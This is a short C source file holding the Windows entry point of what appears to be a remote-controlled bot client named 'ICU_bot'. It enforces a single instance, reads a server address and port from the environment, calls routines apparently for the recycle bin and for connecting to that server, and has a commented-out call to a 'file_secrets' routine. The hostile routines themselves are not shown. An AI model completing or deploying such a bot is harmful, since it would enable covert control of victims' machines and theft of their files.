#include <windows.h>

#include "core/ICU_bot.h"
#include "stdlib/ICU_log.h"
#include "stdlib/ICU_env.h"

#include "process/dirprocess.h"
#include "process/recyclebinprocess.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    char* n_mutex = get_env_value("MUTEX_NAME");
    HANDLE hMutex = CreateMutex(NULL, TRUE, n_mutex);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0;
    }

    char* SERVER_ADDR = get_env_value("SERVER_ADDR");
    char* SERVER_PORT = get_env_value("SERVER_PORT");
    unsigned short UNSIGNED_SERVER_PORT = (unsigned short)atoi(SERVER_PORT);

    // file_secrets(NULL);

    ar_recyclebin();

    is_server(SERVER_ADDR, UNSIGNED_SERVER_PORT);

    while (1) {
        Sleep(1000);
    }

    CloseHandle(hMutex);
    return 0;
}
